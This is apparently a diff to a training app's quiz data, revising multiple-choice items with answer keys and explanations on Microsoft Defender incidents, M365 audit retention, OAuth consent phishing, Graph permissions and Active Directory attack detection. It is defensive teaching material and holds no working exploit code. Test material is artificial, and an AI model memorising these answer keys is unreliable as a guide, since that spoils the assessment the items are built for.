-        "question": "Two tenants suffer an identical intrusion. Tenant A has Live Response enabled and AIR set to fully automatic; Tenant B has AIR set to require approval for every action and Live Response disabled. What is the most accurate expectation for how the resulting incidents will differ?",
+        "question": "A tenant runs AIR at a Semi automation level that requires approval for files outside temporary folders. AIR returns Malicious for two files on one device: one in %TEMP% and one in C:\\ProgramData\\. When you open the incident, what will you most likely find?",
         "options": [
           {
-            "label": "There is no real difference, because Advanced features settings only change the portal's color scheme and have no effect on investigation or remediation.",
+            "label": "Both files already quarantined, since a Malicious verdict on a file is remediated without waiting for approval.",
             "value": "a"
           },
           {
-            "label": "Tenant A's incident will likely arrive with more remediation already completed and richer live forensic detail available, while Tenant B will need more manual analyst work for the same intrusion.",
+            "label": "The %TEMP% file already quarantined, and the ProgramData file's quarantine waiting in the pending-actions queue.",
             "value": "b"
           },
           {
-            "label": "Tenant B's incident will automatically merge with Tenant A's incident, since Advanced features settings synchronize incident data across separate customer tenants.",
+            "label": "Both quarantine actions waiting for approval, since Semi automation sends remediation to an analyst first.",
             "value": "c"
           },
           {
-            "label": "Tenant A's incident graph will be hidden entirely, because enabling Live Response disables the incident graph visualization for that tenant.",
+            "label": "Neither file acted on, only a recommendation, since Semi automation leaves remediation to the analyst.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Advanced features are standing tenant-wide policy choices: fully automatic AIR plus Live Response means more remediation happens automatically and analysts can pull live forensic data during the investigation, while approval-required AIR with Live Response disabled pushes more of that work onto the analyst manually. The 'only changes the color scheme' option wrongly claims no functional effect. The automatic-merge option invents cross-tenant incident merging, which does not happen. The claim that Tenant A's incident graph is hidden is false — enabling Live Response does not hide the incident graph."
+        "explanation": "At a Semi level some actions run automatically and others need approval; in this scope, artifacts in temporary folders are remediated automatically, while those in non-temp folders wait in the pending-actions queue. \"Both files already quarantined\" describes Full automation, not Semi. \"Both quarantine actions waiting for approval\" is wrong: Semi is not 'approve everything'; this scope auto-remediates temporary folders. \"Neither file acted on, only a recommendation\" describes the No automated response level, where AIR investigates and recommends but takes no action."
       },
       {
-        "question": "You finish investigating an incident and confirm it was a genuine attacker who took over a user account. Beyond marking the incident True positive, what must you also set so it feeds quarterly security metrics, and what is the rule about doing so?",
+        "question": "You confirm that an external attacker signed in to a user's account with a stolen password and used it to read and forward mail. No malware was involved. Which classification and determination should you set when closing the incident?",
         "options": [
           {
-            "label": "A specific determination such as CompromisedAccount, which records why it was true; a determination can only be set once a classification like True positive has been chosen.",
+            "label": "True positive, with determination CompromisedAccount, set once the classification has been chosen.",
             "value": "a"
           },
           {
-            "label": "Nothing further is needed, because marking an incident True positive automatically fills in every reason code and reporting field on its own without any additional analyst input at all.",
+            "label": "True positive, with determination MaliciousUserActivity, since the account was used for malicious actions.",
             "value": "b"
           },
           {
-            "label": "Only the severity, which you must manually raise to High, because Defender derives all quarterly metrics purely from the severity value and ignores classification entirely.",
+            "label": "True positive, with determination MultiStagedAttack, since the incident groups several alerts together.",
             "value": "c"
           },
           {
-            "label": "A brand-new custom label you invent for this case, because Defender has no predefined reason codes and expects each analyst to freely type their own determination text.",
+            "label": "Informational, expected activity, with ConfirmedActivity, since the sign-ins really did take place.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Classification is the coarse verdict; determination is the specific reason code (Malware, Phishing, CompromisedAccount, MultiStagedAttack, etc.) that powers reporting metrics — and it can only be set once a classification such as True positive has been chosen. The 'nothing further is needed' option is wrong because the determination is a separate field you must set. The 'only the severity' option misstates how metrics work; severity is a triage priority, not a determination. The 'custom label you invent' option is false — determinations come from a fixed enumerated list, not free text."
+        "explanation": "A real attacker taking over an account is a True positive, and the reason code that records why is CompromisedAccount. Defender lets you set a determination only after a classification has been chosen. \"MaliciousUserActivity\" is the near miss: it fits a legitimate account holder acting maliciously, while here the owner was a victim and someone else used the account. \"MultiStagedAttack\" is wrong: having several alerts in one incident does not make it a multi-stage attack, and it would hide the specific account-takeover reason that metrics rely on. \"Informational, expected activity\" is wrong: that classification is for activity confirmed as expected or authorised, such as security testing, not an attacker's sign-ins."
       },
       {
-        "question": "An incident includes an alert about a Kerberoasting attempt and lateral movement against on-premises Active Directory domain controllers. Which Defender sensor most likely raised this alert?",
+        "question": "An incident contains alerts that a user granted a newly registered third-party app broad mailbox permissions through OAuth consent, followed by a mass download of SharePoint files through that app. Which Defender sensor most likely raised these alerts?",
         "options": [
           {
-            "label": "Microsoft Defender for Identity (MDI), which monitors on-premises Active Directory and domain controllers for credential attacks like Kerberoasting and lateral movement.",
+            "label": "Microsoft Defender for Cloud Apps (MDCA), which watches cloud app usage, OAuth apps and mass downloads.",
             "value": "a"
           },
           {
-            "label": "Microsoft Defender for Office 365 (MDO), because email protection is the component responsible for detecting every Active Directory credential attack across the network.",
+            "label": "Microsoft Defender for Office 365 (MDO), since the activity touched a mailbox and SharePoint content.",
             "value": "b"
           },
           {
-            "label": "Microsoft Defender for Cloud Apps (MDCA), since it inspects on-premises domain controller traffic as its primary and only monitoring responsibility in the stack.",
+            "label": "Microsoft Entra ID Protection, since granting consent to an app is a sign-in and identity risk event.",
             "value": "c"
           },
           {
-            "label": "Microsoft Entra ID Protection, because it watches on-premises Kerberos ticket requests directly on each domain controller rather than cloud sign-in risk.",
+            "label": "Microsoft Defender for Identity (MDI), since the app received permissions over the user's identity.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Microsoft Defender for Identity (MDI) is the sensor that watches on-premises Active Directory and domain controllers, raising alerts for credential attacks such as Kerberoasting, Pass-the-Hash, DCSync, and lateral movement. MDO is email/collaboration security. MDCA watches cloud app usage, not domain controllers. Entra ID Protection scores cloud sign-in and user risk, not on-premises Kerberos activity on the DC itself."
+        "explanation": "MDCA watches cloud app activity, OAuth apps and shadow IT; risky OAuth consent and mass download are among its example alerts. \"Microsoft Defender for Office 365\" is the tempting miss because mail and SharePoint are involved, but MDO detects malicious URLs, attachments and impersonation, not a third-party app's granted permissions and data pull. \"Microsoft Entra ID Protection\" is wrong: it scores risky sign-ins and risky users (anonymous IPs, unfamiliar sign-in properties, leaked credentials), not app consent activity. \"Microsoft Defender for Identity\" is wrong: MDI watches on-premises Active Directory and domain controllers, not cloud app permissions."
       }
     ],
     "references": [
@@ -6356,142 +6356,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "During an M365 account-takeover investigation, which data source is the best first place to reconstruct what the compromised user's account actually did across email, files, and settings — for example, discovering a malicious inbox rule left for persistence?",
+        "question": "During an M365 account-takeover investigation you need to reconstruct what the compromised account did across email, files and settings over the past week, including when a forwarding inbox rule was created and from which IP. Which source is the best first place to look?",
         "options": [
           {
-            "label": "The DeviceRegistryEvents table, because M365 mailbox rules and file shares are stored as Windows registry keys on the user's endpoint device.",
+            "label": "Entra ID sign-in logs, since each action a user takes in Exchange, SharePoint and Teams is logged as a sign-in",
             "value": "a"
           },
           {
-            "label": "The Microsoft 365 unified audit log, because it is the single trail of who did what across Exchange, SharePoint, OneDrive, and Teams, including inbox-rule creation.",
+            "label": "The unified audit log, since it is one trail of user and admin actions across Exchange, SharePoint, OneDrive and Teams",
             "value": "b"
           },
           {
-            "label": "The AWS CloudTrail log, because it records the management-plane API calls for all Microsoft 365 workloads in the organisation's tenant.",
+            "label": "Advanced Hunting’s EmailEvents table, since it records the inbox rules and file shares that each mailbox owner creates",
             "value": "c"
           },
           {
-            "label": "The Safe Attachments detonation report, because sandbox analysis of email attachments also lists every inbox rule and file-sharing action the account performed.",
+            "label": "The Graph messageRules endpoint, since it returns every rule the mailbox has ever had, with its creator, time and IP",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The unified audit log is M365's consolidated record of user and admin actions across all workloads, capturing operations like New-InboxRule, so it is the natural first place to reconstruct what a compromised account did. The DeviceRegistryEvents option is wrong because M365 cloud actions are not stored as endpoint registry keys. The CloudTrail option is wrong because CloudTrail is AWS, not Microsoft 365. The detonation-report option misdescribes Safe Attachments, which detonates files and does not log inbox rules or sharing actions."
+        "explanation": "The unified audit log is the tenant-wide record of actions taken, with who, what, when, ClientIP and target, so it shows the New-InboxRule event and the account’s file and sharing activity in one place. Entra sign-in logs record sign-ins, not the actions taken afterwards inside Exchange or SharePoint. EmailEvents is mail-flow telemetry in Advanced Hunting, not a record of rule creation or file sharing. The messageRules endpoint shows the rules that exist right now; Graph queries return current object state, not a history of who created a rule, when and from where."
       },
       {
-        "question": "In an OAuth consent phishing attack, a victim is tricked into approving a malicious app that requests Mail.Read, Files.Read.All, and offline_access. What is the connection to Microsoft Graph, and why does it make the attack dangerous?",
+        "question": "In an OAuth consent phishing attack, a victim approves a malicious app that requests Mail.Read, Files.Read.All and offline_access. What is the connection to Microsoft Graph, and why does it make the attack dangerous?",
         "options": [
           {
-            "label": "Those are Microsoft Graph permission scopes, so the app calls Graph with tokens to read the victim's mail and files without needing the password, surviving a reset.",
+            "label": "They are Graph scopes: the app calls Graph with tokens to read mail and files, so a password reset alone does not end it",
             "value": "a"
           },
           {
-            "label": "Those permissions apply only to the attacker's own tenant, so Microsoft Graph prevents the app from ever reaching the victim's mailbox or stored files.",
+            "label": "They are Entra ID directory roles: the app gains admin rights over the whole tenant rather than access to one user’s data",
             "value": "b"
           },
           {
-            "label": "Microsoft Graph is unrelated to email, so the requested scopes can only affect the victim's calendar availability and never their actual mail or documents.",
+            "label": "They are Exchange mailbox permissions: the grant is logged as Add-MailboxPermission and stops when the password changes",
             "value": "c"
           },
           {
-            "label": "The scopes force the victim to re-enter their password on every Graph call, which is why the attack is easily detected and blocked by standard MFA prompts.",
+            "label": "They are delegated Graph scopes that need the user to sign in for every call, so the access ends once the session closes",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Mail.Read, Files.Read.All, and offline_access are Microsoft Graph permission scopes, so the consented app calls graph.microsoft.com with tokens to read the victim's mail and files without the password — and because it uses tokens, the access survives a password reset. The 'attacker's own tenant only' option is wrong because the granted scopes apply to the victim's data. The calendar-only option falsely claims Graph is unrelated to email. The password re-entry option is wrong because token-based Graph access does not re-prompt for a password or MFA."
+        "explanation": "Mail.Read, Files.Read.All and offline_access are Microsoft Graph scopes, so the consented app reads the victim’s mail and files through graph.microsoft.com using tokens, not the password; that is why response means revoking the app’s consent and tokens, not only resetting the password. They are permission scopes, not directory roles, so they grant access to data rather than tenant administration. Add-MailboxPermission is an Exchange admin operation that grants mailbox access; it is not how an OAuth consent is recorded. offline_access exists precisely so the app does not need the user to sign in again: it receives a refresh token that keeps access alive."
       },
       {
-        "question": "An unfamiliar app in the tenant holds an application-level (not delegated) Mail.Read Graph permission. Why is this generally more concerning than the same permission granted as a delegated scope?",
+        "question": "An unfamiliar app in the tenant holds Mail.Read as an application permission, not as a delegated one. Why is this generally the more concerning finding?",
         "options": [
           {
-            "label": "Application permissions can act tenant-wide without any signed-in user present, unlike delegated permissions which are limited to what that one signed-in user could do.",
+            "label": "Application permissions act on the app’s own authority, tenant-wide, with no signed-in user to limit what they reach",
             "value": "a"
           },
           {
-            "label": "Application permissions are always automatically revoked after 24 hours, so the real concern is only delegated scopes which can persist indefinitely once granted.",
+            "label": "Application permissions are limited to the mailbox of the admin who granted them, which is usually the most valuable one",
             "value": "b"
           },
           {
-            "label": "There is no practical difference between application and delegated permissions in Microsoft Graph; both grant identical single-user access regardless of configuration.",
+            "label": "Delegated permissions are the riskier kind, as they let the app act tenant-wide for any user who ever signs in to it",
             "value": "c"
           },
           {
-            "label": "Application permissions only work inside Microsoft Teams chats, so a Mail.Read application permission cannot actually be used to read any mailbox content.",
+            "label": "Both are limited to the signed-in user’s own access; application is riskier only because it is harder to revoke",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Application permissions let an app act on its own, without a signed-in user, and can reach broadly across the tenant rather than being limited to one user's own access — which is why an unfamiliar app holding one is a higher-risk finding than the same scope held as a delegated permission. The 24-hour revocation option invents an automatic 24-hour revocation that does not exist. The 'no practical difference' option is false; the two permission types behave very differently. The Teams-only option incorrectly restricts application permissions to Teams only."
+        "explanation": "An application permission lets the app act by itself, without a signed-in user, across the whole tenant, so application-level Mail.Read can read every mailbox. A delegated permission is limited to what the signed-in user could do themselves. Limiting an application permission to the consenting admin’s mailbox describes neither model. The delegated-is-riskier option reverses the two. Saying both are limited to one user misses the defining difference: application permissions have no user context to constrain them."
       },
       {
-        "question": "A breach at a tenant is discovered nine months after it began. The compromised user was licensed with Microsoft 365 E3 only (no Purview Audit add-on). What does this most likely mean for the investigation, and why?",
+        "question": "A breach is discovered nine months after it began. The compromised user was licensed with Microsoft 365 E3 only, with no Purview Audit add-on, although the tenant also has 340 E5 seats for other staff. What does this most likely mean for the investigation?",
         "options": [
           {
-            "label": "Nothing changes; Microsoft 365 E3 and E5 provide identical unified audit log retention of ten years for every licensed user regardless of add-ons.",
+            "label": "The records should still be there: Audit (Standard) keeps Exchange, SharePoint and Entra records for one year",
             "value": "a"
           },
           {
-            "label": "The relevant unified audit log records are likely gone: Audit (Standard) under E3 retains records for 180 days by default, far short of nine months.",
+            "label": "The relevant records are likely gone: Audit (Standard), which this user is on, keeps records for 180 days",
             "value": "b"
           },
           {
-            "label": "The investigation is unaffected because audit log retention is governed only by the region the tenant is hosted in, never by the user's license.",
+            "label": "The records never existed: E3 does not include unified audit logging unless an add-on is bought",
             "value": "c"
           },
           {
-            "label": "E3 users get unlimited audit retention while only E5 users are capped at 180 days, so the E3 account's full history should still be present.",
+            "label": "The records should still be there: because the tenant holds E5 seats, Premium retention covers the whole tenant",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Audit (Standard), the tier applied without Purview Audit Premium (bundled with E5 or an add-on), retains records for 180 days by default — well short of nine months — so the relevant evidence for this E3-only user has likely already expired. The 'nothing changes' option fabricates identical ten-year retention for E3 and E5. The region-governed option invents a region-based rule. The claim that E3 gets unlimited retention inverts the actual relationship between license tier and retention length. Note also that Audit (Standard) is on by default, so the gap is retention, not disabled logging."
+        "explanation": "Without E5 or the Purview Audit add-on, this user is on Audit (Standard), which retains records for 180 days, so evidence from the start of a nine-month-old breach has most likely aged out. One-year retention for Exchange, SharePoint, OneDrive and Entra records is Audit (Premium), not Standard. E3 includes Audit (Standard), so records were captured; the problem is how long they are kept. Premium retention is per licensed user, not tenant-wide, so the E5 seats held by other staff do not extend this E3 user’s retention."
       },
       {
-        "question": "You need to hunt across an entire tenant for sign-ins flagged with an elevated risk state in the last 24 hours, using Microsoft Graph rather than clicking through the portal one user at a time. What is the correct general approach?",
+        "question": "You need to hunt across the whole tenant, through Microsoft Graph, for individual sign-ins in the last 24 hours that carry an elevated risk state. Which request approach is correct?",
         "options": [
           {
-            "label": "Query the auditLogs/signIns endpoint with an OData $filter bounding createdDateTime to the last 24 hours and filtering on riskState, using $top to page results.",
+            "label": "Query auditLogs/signIns with $filter on createdDateTime for the 24-hour window and on riskState, paging with $top",
             "value": "a"
           },
           {
-            "label": "Graph has no way to query sign-in risk in bulk; the only option is to open each user's profile individually in the Entra admin portal and read it visually.",
+            "label": "Query identityProtection/riskyUsers with $filter on riskLevel, since it lists each risky sign-in with its time and IP",
             "value": "b"
           },
           {
-            "label": "Send an unfiltered GET request to auditLogs/signIns with no $filter or $top parameters, since Graph automatically limits results to the last 24 hours anyway.",
+            "label": "Query auditLogs/signIns with only $top=100, since Graph returns the newest sign-ins first and covers the last day",
             "value": "c"
           },
           {
-            "label": "Use AWS CloudTrail's Insights feature pointed at the Microsoft 365 tenant, since CloudTrail natively ingests Entra ID sign-in risk data across clouds.",
+            "label": "Query auditLogs/signIns with $select=riskState,createdDateTime, which keeps only risky sign-ins from the last day",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Graph's auditLogs/signIns endpoint supports OData $filter (bounding createdDateTime and matching riskState) and $top for paging, letting an analyst hunt in bulk rather than clicking through users one at a time; Graph explicitly recommends bounding by time to avoid timeouts. The 'open each user's profile individually' option wrongly claims no bulk capability exists. The unfiltered GET request option is wrong because Graph does not auto-bound queries — an unfiltered large query risks timing out. The CloudTrail Insights option confuses AWS CloudTrail, which has no relationship to Microsoft 365 sign-in data, with Graph."
+        "explanation": "Sign-in records live at auditLogs/signIns, and $filter is the parameter that narrows records, so bounding createdDateTime to the window and matching riskState returns exactly the risky sign-ins, with $top controlling page size (and @odata.nextLink for further pages). riskyUsers is a list of users Identity Protection currently rates as risky, not a list of individual sign-ins with times. Graph does not bound sign-in queries to a recent window for you; an unbounded query against a large tenant can time out. $select only chooses which fields come back; it does not filter which records are returned."
       },
       {
-        "question": "A consented app in your tenant holds two Graph scopes: Mail.Read and offline_access. Why is the offline_access scope the detail that turns a one-time consent into durable, password-independent persistence?",
+        "question": "A consented app in your tenant holds two Graph scopes as delegated permissions: Mail.Read and offline_access. Why is offline_access the detail that turns a one-time consent into durable, password-independent access?",
         "options": [
           {
-            "label": "offline_access grants a refresh token, so the app can keep minting new access tokens for weeks without the user re-authenticating — sustaining mailbox access long after the single consent click.",
+            "label": "It issues a refresh token, so the app can mint new access tokens for weeks without the user signing in again",
             "value": "a"
           },
           {
-            "label": "offline_access encrypts the mailbox so only the attacker can read it, locking the legitimate user out permanently.",
+            "label": "It lets the app keep working while the user’s device is offline, which matters little for a cloud mailbox",
             "value": "b"
           },
           {
-            "label": "offline_access is a harmless scope that only lets the app work when the network is down, so it adds no real risk to the mailbox.",
+            "label": "It is the scope that actually reads message bodies; Mail.Read on its own only lists the mailbox’s folders",
             "value": "c"
           },
           {
-            "label": "offline_access automatically grants tenant-wide admin rights, replacing the need for any other Graph permission at all.",
+            "label": "It converts the grant to an application permission, so the app can act tenant-wide with no user present",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "offline_access issues a refresh token, letting the app silently obtain fresh access tokens for a long period without the user signing in again, so Mail.Read plus offline_access becomes standing mailbox access rather than a one-off read. The mailbox-encryption option invents ransomware-style encryption that this scope does not perform. The 'harmless offline scope' option mistakes it for an offline-availability feature and understates the risk. The tenant-wide-admin option wrongly claims it confers admin rights on its own."
+        "explanation": "offline_access hands the app a refresh token, which it uses to obtain fresh access tokens for a long period without the user re-authenticating, so Mail.Read plus offline_access becomes standing mailbox access. The name suggests offline device support, but that literal reading misses the refresh token, which is the real risk. Mail.Read itself grants reading mailbox contents. offline_access does not change the permission type; the grant stays delegated and limited to this user’s mailbox, which is still serious because it persists."
       }
     ],
     "references": [
@@ -6581,165 +6581,165 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "An attacker gains the ability to read the NTDS.dit file from a Domain Controller. Why is this considered a full domain compromise, and what makes the Domain Controller such a high-value target?",
+        "question": "An alert says someone read the NTDS.dit file on a Domain Controller. Why do defenders treat this as reaching the whole domain rather than one server?",
         "options": [
           {
-            "label": "It is not serious, because NTDS.dit only stores printer and network-share locations, so the attacker gains nothing beyond a directory of office resources.",
+            "label": "It holds the Group Policy files that every computer reads, so settings could be changed domain-wide.",
             "value": "a"
           },
           {
-            "label": "NTDS.dit contains every object in the domain including all account password hashes, so reading it hands the attacker credentials to the entire organisation.",
+            "label": "It holds every object in the domain, including the password hash of every account, admins included.",
             "value": "b"
           },
           {
-            "label": "It only affects a single user, because each Domain Controller stores just the one administrator account that happens to be logged in at that moment.",
+            "label": "It holds the Kerberos tickets issued in the last ten hours, so active sessions could be reused.",
             "value": "c"
           },
           {
-            "label": "The risk is purely about disk space, because NTDS.dit is a large file and copying it merely slows the Domain Controller down temporarily.",
+            "label": "It holds the accounts of users who recently signed in through that DC, giving their credentials.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "NTDS.dit is the AD database file on a Domain Controller and contains every object in the domain, including the password hashes of all accounts up to the administrators, so obtaining it gives an attacker credentials to the whole organisation — which is why the DC is Tier 0 and its compromise equals domain compromise. The printer-and-share-locations option wrongly trivialises the file's contents. The single-user option is false because the DC holds the entire domain database, not one account. The disk-space option ignores the actual credential exposure."
+        "explanation": "NTDS.dit is the Active Directory database on every DC. It contains every object in the domain and the password hashes of every account, including the administrators, so reading it yields credentials for the whole organisation. That is why the DC is Tier 0. \"Group Policy files\" is wrong: Group Policy files live in the SYSVOL share, not in NTDS.dit. \"Kerberos tickets issued in the last ten hours\" is wrong: tickets are handed to clients when they ask for them; the database holds accounts and their hashes, which is far worse because hashes do not expire. \"Users who recently signed in through that DC\" is wrong: every DC holds a full copy of the domain database, not just the accounts it authenticated."
       },
       {
-        "question": "In Active Directory, which statement about the forest and domain structure is correct, and why does it matter to a SOC analyst assessing the blast radius of an intrusion?",
+        "question": "An attacker has taken control of a Domain Controller in the child domain sales.example.com, which sits in the same forest as example.com. Which unit should the analyst treat as the security boundary when scoping the intrusion?",
         "options": [
           {
-            "label": "Each Organisational Unit (OU) is a separate security boundary, so an attacker who compromises one OU can never affect users or computers in any other OU.",
+            "label": "The OU, since Group Policy and admin rights are delegated per OU, which keeps other OUs out of reach.",
             "value": "a"
           },
           {
-            "label": "The forest is the true security boundary; everything inside it trusts each other deeply, so the analyst must treat the whole forest as potentially compromised together.",
+            "label": "The forest, since every domain in it trusts the others deeply, so the whole forest is at risk together.",
             "value": "b"
           },
           {
-            "label": "The individual domain is the outermost boundary, so a compromise can never spread from one domain to another domain within the same forest under any circumstances.",
+            "label": "The domain, since each domain has its own database and DCs, so a child-domain compromise stays inside it.",
             "value": "c"
           },
           {
-            "label": "Trees are the top-level security boundary, so multiple forests inside a tree are fully isolated from one another and share no trust of any kind.",
+            "label": "The tree, since domains that share a namespace trust each other while other trees in the forest stay apart.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The forest — not the domain, OU, or tree — is Active Directory's real security boundary; everything inside a forest trusts each other at a deep level, so an analyst must consider the whole forest at risk together and recognise that owning one domain's DC creates a path across the forest. The OU-as-boundary option is wrong because OUs organise objects and apply policy but are not security boundaries. The domain-as-outermost and tree-as-top-level options invert the hierarchy: the domain is not the outermost boundary, and forests are the top-level container, not trees."
+        "explanation": "The forest, not the domain, is Active Directory's real security boundary: everything inside a forest trusts everything else at a deep level, so owning one domain's DC gives a path to the rest, for example from Domain Admin toward Enterprise Admin. \"The OU\" is wrong: OUs organise objects, apply Group Policy and delegate administration, but they are not security boundaries. \"The domain\" is the common misconception: each domain does keep its own domain partition, but the domains still trust each other inside the forest. \"The tree\" is wrong: trees only describe a shared naming space; trees in the same forest trust each other just as domains do."
       },
       {
-        "question": "You are building detections for early-stage Active Directory attacks. Which pair of observations best matches its likely technique?",
+        "question": "You are building detections for early-stage Active Directory attacks. Which option correctly pairs each observation with its likely technique?",
         "options": [
           {
-            "label": "A spike of Kerberos service-ticket requests (Event 4769) suggests Kerberoasting, and an account suddenly added to Domain Admins (Event 4728/4732) suggests privilege escalation or persistence.",
+            "label": "A burst of 4769 for many service accounts: Kerberoasting. An account added to Domain Admins (4728): escalation or persistence.",
             "value": "a"
           },
           {
-            "label": "A spike of Event 4769 means the DNS server crashed, and an Event 4728 means a user simply changed their own display name in their profile settings.",
+            "label": "A burst of 4769 for many service accounts: password spraying. An account added to Domain Admins (4728): a new account created.",
             "value": "b"
           },
           {
-            "label": "A spike of Event 4769 indicates a printer was installed, and Event 4732 shows that Group Policy successfully refreshed on a workstation as scheduled.",
+            "label": "A burst of 4771 across many accounts: Kerberoasting. A spike of 4776 NTLM validations: DCSync replication from a workstation.",
             "value": "c"
           },
           {
-            "label": "Both Event 4769 and Event 4728 only ever occur during routine backups, so neither is useful for detecting any Active Directory attack technique.",
+            "label": "A burst of 4768 for one account: Pass-the-Hash. An account added to Domain Admins (4728): a routine password reset.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A burst of Kerberos service-ticket requests (4769) is the classic Kerberoasting signature, since the attacker collects service tickets to crack offline, and adding an account to a privileged group like Domain Admins (4728/4732) is a hallmark of escalation or persistence — both are high-value AD detections. The other options misattribute these events to DNS crashes, display-name changes, printer installs, GPO refreshes, or backups, none of which is what these Security Event IDs record."
+        "explanation": "A burst of service-ticket requests (4769) for many service accounts is the Kerberoasting signature, because the attacker collects tickets to crack offline; adding an account to Domain Admins (4728) is escalation or persistence. \"Password spraying\" is wrong: spraying shows up as many failed logons (4625/4771) across accounts, not service-ticket requests, and account creation is 4720, not 4728. The 4771/4776 option swaps meanings: 4771 failures across many accounts point to spraying, 4776 spikes point to NTLM brute force or Pass-the-Hash, and DCSync shows up as 4662 with replication GUIDs. The 4768 option is wrong: 4768 is a normal TGT request at logon, and a password reset is 4724, not 4728."
       },
       {
-        "question": "A Windows Security Event 4768 is generated for a user account, followed moments later by an Event 4769 for a file-server resource that same user just opened. What does this pair of events represent, based on how Kerberos actually works?",
+        "question": "A Windows Security Event 4768 is logged for a user, followed moments later by one Event 4769 for a file-server resource that the same user just opened. What does this pair of events represent?",
         "options": [
           {
-            "label": "The 4768 is the user requesting a Ticket-Granting Ticket at logon, and the 4769 is that same TGT being exchanged for a service ticket to reach the file server.",
+            "label": "The 4768 is the user's TGT request at logon, and the 4769 exchanges that TGT for a service ticket to the file server.",
             "value": "a"
           },
           {
-            "label": "The 4768 means the user's password was reset by an administrator, and the 4769 means the file server itself was renamed on the network.",
+            "label": "The 4768 is a service ticket for the workstation, and the 4769 renews the user's TGT so it can reach the file server.",
             "value": "b"
           },
           {
-            "label": "The 4768 and 4769 both represent the exact same action recorded twice, so only one of the two events carries any real investigative value.",
+            "label": "The 4768 is a failed Kerberos pre-authentication, and the 4769 is the successful retry with the correct password.",
             "value": "c"
           },
           {
-            "label": "The 4768 shows a failed logon attempt, and the 4769 shows Group Policy being applied to the workstation a few seconds afterward.",
+            "label": "The 4768 is the user's TGT request, and the 4769 shows Kerberoasting because it names a server's service account.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Kerberos is a two-step ticket system: 4768 logs the initial AS-REQ/AS-REP exchange where the DC issues a Ticket-Granting Ticket, and 4769 logs each later TGS-REQ/TGS-REP where that TGT is exchanged for a service ticket to a specific resource like a file server — exactly the flow walked through in the worked login example. The password-reset/server-rename option invents unrelated meanings for both event IDs. The 'same action recorded twice' option is wrong because they represent two distinct, sequential steps, not a duplicate. The failed-logon/Group Policy option misassigns both events to logon failure and Group Policy, neither of which they record."
+        "explanation": "Kerberos is a two-step system: 4768 logs the AS-REQ in which the DC issues a Ticket-Granting Ticket, and 4769 logs each later TGS-REQ in which that TGT is exchanged for a service ticket to one resource, exactly as in the worked logon example. \"Service ticket for the workstation ... renews the user's TGT\" swaps the two events: 4768 is the TGT, 4769 is the service ticket. \"A failed Kerberos pre-authentication\" is wrong: pre-authentication failures are 4771, and 4768 records a TGT request. \"Shows Kerberoasting\" is wrong: one service ticket for a resource the user actually opened is normal; Kerberoasting is a rapid burst of 4769s for many service accounts."
       },
       {
-        "question": "The PDC Emulator FSMO role suddenly becomes unreachable due to a hardware failure on the DC that holds it, and its clock had already drifted noticeably before the failure. What domain-wide problem does this most directly explain?",
+        "question": "The DC holding the PDC Emulator role fails, and its clock had already drifted noticeably before the failure. Which domain-wide symptom does this most directly explain?",
         "options": [
           {
-            "label": "Nothing changes, because the PDC Emulator only manages printer queues and has no effect on authentication or logons anywhere in the domain.",
+            "label": "New users and groups cannot be created, since the PDC Emulator hands out the relative IDs for new accounts.",
             "value": "a"
           },
           {
-            "label": "Kerberos authentication failures across the domain, because the PDC Emulator is the domain's authoritative time source and Kerberos tickets are time-sensitive.",
+            "label": "Kerberos logons fail across the domain, since it is the domain's time source and tickets are time-sensitive.",
             "value": "b"
           },
           {
-            "label": "The Global Catalog stops responding forest-wide, because the PDC Emulator role and the Global Catalog role are always hosted on the exact same server.",
+            "label": "Forest-wide searches by email fail, since the PDC Emulator holds the Global Catalog's copy of every domain.",
             "value": "c"
           },
           {
-            "label": "Every DNS SRV record in the domain is permanently deleted, since the PDC Emulator is solely responsible for creating and maintaining all DNS zone data.",
+            "label": "New domains cannot be added to the forest, since the PDC Emulator controls the forest's list of domains.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The PDC Emulator is the domain's authoritative time source, and Kerberos relies on closely synchronised clocks to validate ticket timestamps, so a drifting or unreachable PDC Emulator cascades into domain-wide Kerberos authentication failures. The 'only manages printer queues' option wrongly trivialises the role. The Global Catalog option invents a hard link between PDC Emulator and Global Catalog placement that does not exist. The DNS SRV record deletion option misattributes DNS zone ownership, which is not what the PDC Emulator role does."
+        "explanation": "The PDC Emulator is the domain's authoritative time source, and Kerberos tickets are time-sensitive, so a drifting or missing time source shows up as Kerberos authentication failures across the domain. \"New users and groups cannot be created\" describes the RID Master, which allocates relative IDs. \"Forest-wide searches by email fail\" describes the Global Catalog, a separate role that any DC can be configured to hold. \"New domains cannot be added\" describes the Domain Naming Master, a forest-wide role."
       },
       {
-        "question": "An analyst needs to find every user across a five-domain forest whose email address matches a given value, in a single query rather than querying each domain separately. Which service should the query target, and on which port?",
+        "question": "An analyst needs to find every user across a five-domain forest whose email address matches a given value, in one query rather than querying each domain separately. Which service and port should the query target?",
         "options": [
           {
-            "label": "The Global Catalog, on port 3268, because it holds a partial, read-only replica of every object across all domains in the forest.",
+            "label": "The Global Catalog on port 3268, which holds a partial, read-only copy of every object in every domain.",
             "value": "a"
           },
           {
-            "label": "The RID Master, on port 88, because the RID Master is responsible for indexing every user's email address forest-wide.",
+            "label": "Any domain controller on port 389, since standard LDAP on a DC searches every domain in the forest.",
             "value": "b"
           },
           {
-            "label": "SYSVOL, on port 445, because SYSVOL stores a searchable index of every domain's user attributes for fast forest-wide lookup.",
+            "label": "The Global Catalog on port 88, since forest-wide lookups travel over the Kerberos service on the DC.",
             "value": "c"
           },
           {
-            "label": "The Schema Master, on port 3389, because the Schema Master maintains a live, queryable list of all user email addresses in the forest.",
